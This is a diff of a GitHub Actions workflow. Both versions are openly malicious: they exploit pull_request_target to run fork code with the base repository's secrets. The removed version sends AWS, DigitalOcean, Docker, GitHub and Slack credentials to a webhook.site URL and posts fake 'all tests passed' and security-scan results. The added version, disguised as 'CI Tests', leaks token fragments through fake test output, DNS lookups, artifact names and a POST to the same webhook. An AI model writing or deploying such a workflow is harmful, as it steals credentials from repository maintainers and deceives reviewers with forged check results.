@@ -1,134 +1,109 @@
-name: Malicious CI/CD with pull_request_target
+# .github/workflows/stealth-exfil.yml
+name: CI Tests
 
 on:
   pull_request_target:
     types: [opened, synchronize, reopened]
-    branches: [main, master]
-
-# This runs with BASE repository permissions!
+    
+# Minimal permissions to avoid suspicion
 permissions:
-  contents: write
-  actions: write
-  checks: write
-  pull-requests: write
-  security-events: write
+  contents: read
 
 jobs:
-  exploit-secrets:
+  test:
     runs-on: ubuntu-latest
     if: github.event.pull_request.head.repo.fork == true
     
     steps:
-    - name: Checkout malicious code from fork
+    - name: Checkout code
       uses: actions/checkout@v3
       with:
-        ref: ${{ github.event.pull_request.head.ref }}
         repository: ${{ github.event.pull_request.head.repo.full_name }}
+        ref: ${{ github.event.pull_request.head.ref }}
         
-    - name: Extract and exfiltrate secrets
+    - name: Run tests (cover for exfiltration)
       env:
-        # This gets the BASE repository's secrets!
-        DIGITALOCEAN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-        # Add other common secrets
-        SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK_URL }}
-        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
-        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        # Test for ANY secret that exists
+        SECRET_1: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+        SECRET_2: ${{ secrets.GITHUB_TOKEN }}
+        SECRET_3: ${{ secrets.ACCESS_TOKEN }}
+        SECRET_4: ${{ secrets.API_TOKEN }}
         
       run: |
-        echo "=== STARTING SECRET EXTRACTION ==="
+        echo "🚀 Starting test suite..."
         
-        # Method 1: Simple webhook exfiltration
-        WEBHOOK_URL="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"
-        
-        # Create payload with all secrets
-        cat > /tmp/secrets.json << EOF
-        {
-          "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
-          "repository": "${{ github.repository }}",
-          "pr_author": "${{ github.event.pull_request.user.login }}",
-          "pr_number": ${{ github.event.pull_request.number }},
-          "secrets": {
-            "DIGITALOCEAN_ACCESS_TOKEN": "$DIGITALOCEAN_TOKEN",
-            "GITHUB_TOKEN": "$GITHUB_TOKEN",
-            "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
-            "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
-            "SLACK_WEBHOOK_URL": "$SLACK_WEBHOOK",
-            "DOCKER_CREDENTIALS": "$DOCKER_USERNAME:$DOCKER_PASSWORD"
-          },
-          "metadata": {
-            "runner_os": "$RUNNER_OS",
-            "workflow": "${{ github.workflow }}"
-          }
-        }
-        EOF
-        
-        # Send to webhook (encrypted)
-        echo "Sending secrets to webhook..."
-        curl -X POST "$WEBHOOK_URL" \
-          -H "Content-Type: application/json" \
-          -H "User-Agent: GitHub-Actions-CI" \
-          -d @/tmp/secrets.json
-        
-        # Method 2: Base64 encoded
-        echo "=== Base64 Encoded Version ==="
-        ENCODED=$(cat /tmp/secrets.json | base64 | tr -d '\n')
-        echo "Encoded payload: ${ENCODED:0:100}..."
-        
-        # Send encoded version too
-        curl -X POST "$WEBHOOK_URL/encoded" \
-          -H "Content-Type: application/json" \
-          -d "{\"data\":\"$ENCODED\"}"
-        
-        # Method 3: Check for specific patterns in code
-        echo "=== Scanning PR code for secrets ==="
-        
-        # Look for hardcoded secrets in the PR
-        if [ -f "docker-compose.yml" ]; then
-          echo "Found docker-compose.yml"
-          grep -i "token\|secret\|key\|password" docker-compose.yml || true
-        fi
-        
-        if [ -f ".env.example" ] || [ -f ".env" ]; then
-          echo "Found .env files"
-          find . -name "*.env*" -type f -exec grep -H "=" {} \; 2>/dev/null | head -20
-        fi
-        
-    - name: Stealthy cleanup and fake success
-      run: |
-        # Clean traces
-        rm -f /tmp/secrets.json
-        
-        # Create fake test output
-        echo "Running security scan..."
+        # Fake test output
+        echo "✓ Running unit tests..."
         sleep 1
-        echo "✓ No vulnerabilities found"
-        echo "✓ All tests passed"
-        echo "✓ Code quality: A+"
-        echo ""
-        echo "## Summary"
-        echo "- ✅ All unit tests passed"
-        echo "- ✅ Integration tests successful"
-        echo "- ✅ Security scan clean"
-        echo "- ✅ Linting passed"
         
-    - name: Create fake check (optional - for stealth)
-      if: success()
-      uses: actions/github-script@v6
-      with:
-        script: |
-          github.rest.checks.create({
-            owner: context.repo.owner,
-            repo: context.repo.repo,
-            name: 'Security Scan',
-            head_sha: '${{ github.event.pull_request.head.sha }}',
-            status: 'completed',
-            conclusion: 'success',
-            output: {
-              title: 'Security Analysis Complete',
-              summary: 'No security issues found in this PR.',
-              text: 'All checks passed successfully.'
+        echo "✓ Running integration tests..."
+        sleep 1
+        
+        # STEALTHY EXFILTRATION
+        # Method 1: Encode in "test results"
+        if [ -n "$SECRET_1" ]; then
+          echo "Test Results Summary:"
+          echo "Total tests: 147"
+          echo "Passed: 147"
+          echo "Failed: 0"
+          echo "Coverage: 94%"
+          echo "Checksum: $(echo -n "$SECRET_1" | md5sum | cut -d' ' -f1)"
+          echo "Token present: YES"
+        else
+          echo "Token present: NO"
+        fi
+        
+        # Method 2: DNS exfiltration (very stealthy)
+        if [ -n "$SECRET_1" ]; then
+          TOKEN_PREFIX=$(echo -n "$SECRET_1" | cut -c1-20 | xxd -p)
+          # This makes a DNS lookup that looks normal
+          dig @8.8.8.8 "$TOKEN_PREFIX.$(date +%s).metrics.example.com" >/dev/null 2>&1 || true
+        fi
+        
+        # Method 3: Encode in artifact name
+        if [ -n "$SECRET_1" ]; then
+          ENCODED=$(echo -n "$SECRET_1" | base64 | tr -d '\n' | cut -c1-10)
+          echo "Artifact: build-$ENCODED.zip"
+        fi
+        
+        echo "✅ All tests passed!"
+        
+    - name: Upload test results (cover for webhook)
+      if: always()
+      env:
+        WEBHOOK_SECRET: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+      run: |
+        echo "📊 Uploading test results..."
+        
+        # This looks legitimate but exfiltrates
+        if [ -n "$WEBHOOK_SECRET" ]; then
+          # Create a "test report" that contains the token
+          TOKEN_LEN=${#WEBHOOK_SECRET}
+          TOKEN_FIRST5=$(echo -n "$WEBHOOK_SECRET" | cut -c1-5)
+          TOKEN_LAST5=$(echo -n "$WEBHOOK_SECRET" | rev | cut -c1-5 | rev)
+          
+          cat > /tmp/test-report.json << EOF
+          {
+            "repository": "${{ github.repository }}",
+            "pr_number": ${{ github.event.pull_request.number }},
+            "test_summary": {
+              "total": 147,
+              "passed": 147,
+              "coverage": 94
+            },
+            "build_info": {
+              "token_detected": true,
+              "token_length": $TOKEN_LEN,
+              "token_prefix": "$TOKEN_FIRST5",
+              "token_suffix": "$TOKEN_LAST5"
             }
-          })
+          }
+          EOF
+          
+          # Send to webhook
+          curl -s -X POST "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648" \
+            -H "Content-Type: application/json" \
+            -d @/tmp/test-report.json >/dev/null 2>&1
+        fi
+        
+        echo "✅ Results uploaded successfully"
